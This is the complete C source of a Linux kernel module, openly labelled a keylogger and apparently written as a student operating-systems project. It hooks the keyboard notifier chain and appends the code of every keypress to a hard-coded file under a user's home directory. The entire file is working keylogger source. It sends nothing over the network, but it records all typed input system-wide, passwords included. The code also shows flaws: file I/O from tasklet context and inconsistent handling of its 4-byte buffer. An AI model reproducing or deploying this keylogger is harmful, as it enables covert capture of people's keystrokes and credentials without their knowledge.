#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/interrupt.h>
#include <linux/notifier.h>

#define BUF_LEN 4

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Aleksandra Hein 184717");
MODULE_DESCRIPTION("Keylogger, which save scancodes to file");

static int log_key(struct notifier_block *nblock, unsigned long code, void *_param); 

static struct file *filp;
static loff_t file_pos;
static char keys_buf[BUF_LEN];
static size_t buf_pos;

static struct notifier_block logging_block = {
	.notifier_call = log_key,
};

static int write_to_file(void) {

	filp = filp_open("/home/ola/Downloads/projekt_os/right_content/logged_key", O_RDWR | O_CREAT | O_APPEND, S_IWUSR | S_IRUSR);
	if(IS_ERR(filp)) {
		return -ENOENT;
	}
	kernel_write(filp, keys_buf, buf_pos + 1, &file_pos);
	filp_close(filp, NULL);
	return 0;
}

static void handle_saving(long unsigned int n) {
	write_to_file();
	buf_pos = 0;
}

DECLARE_TASKLET_OLD(save_char, handle_saving);

int log_key(struct notifier_block *nblock, unsigned long event, void *data)
{
	struct keyboard_notifier_param *param = data;

    if (KBD_KEYCODE == event && param->value == KEY_LEFT && param->down == 1) {
		unsigned int scan_code = 75;
		int l = snprintf(keys_buf, BUF_LEN, "%d", scan_code);
		buf_pos += l;
		keys_buf[buf_pos] = '\n';
		tasklet_schedule(&save_char);
	} else if (KBD_KEYCODE == event && param->value == KEY_RIGHT && param->down == 1) {
		unsigned int scan_code = 77;
		int l = snprintf(keys_buf, BUF_LEN, "%d", scan_code);
		buf_pos += l;
		keys_buf[buf_pos] = '\n';
		tasklet_schedule(&save_char);
	} else if (KBD_KEYCODE == event && param->value == KEY_UP && param->down == 1) {
		unsigned int scan_code = 72;
		int l = snprintf(keys_buf, BUF_LEN, "%d", scan_code);
		buf_pos += l;
		keys_buf[buf_pos] = '\n';
		tasklet_schedule(&save_char);		
	} else if (KBD_KEYCODE == event && param->value == KEY_DOWN && param->down == 1) {
		unsigned int scan_code = 80;
		int l = snprintf(keys_buf, BUF_LEN, "%d", scan_code);
		buf_pos += l;
		keys_buf[buf_pos] = '\n';
		tasklet_schedule(&save_char);		
	}
	else if (KBD_KEYCODE == event && param->down == 1) {
		int l = snprintf(keys_buf, BUF_LEN, "%d", param->value);
		buf_pos += l;
		keys_buf[buf_pos] = '\n';
		tasklet_schedule(&save_char);
	}
	return NOTIFY_OK;
}

static int __init keyloger_init(void)
{	
	buf_pos = 0;
	file_pos = 0;
	register_keyboard_notifier(&logging_block);
	return 0;
}

static void __exit keyloger_exit(void)
{
	unregister_keyboard_notifier(&logging_block);
}

module_init(keyloger_init);
module_exit(keyloger_exit);